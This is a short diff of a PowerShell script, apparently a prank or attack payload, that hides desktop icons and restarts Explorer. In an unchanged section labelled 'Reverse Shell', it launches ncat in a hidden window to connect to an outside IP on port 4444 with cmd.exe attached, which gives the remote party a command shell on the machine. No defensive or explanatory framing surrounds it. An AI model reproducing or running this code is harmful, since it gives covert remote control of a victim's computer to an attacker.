@@ -67,12 +67,13 @@ public class Wallpaper {
 # Hide desktop icons and restart Explorer
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 1
 Stop-Process -Name explorer -Force
-Start-Process explorer.exe -WindowStyle Minimized
+Start-Process explorer.exe 
 
 #Reverse Shell
 Set-Location $env:USERPROFILE
 $Ncat = "C:\Program Files (x86)\Nmap\ncat.exe"
 Start-Process -FilePath $Ncat -ArgumentList "10.93.74.204 4444 -e cmd.exe" -WindowStyle Hidden
+
 
 
 
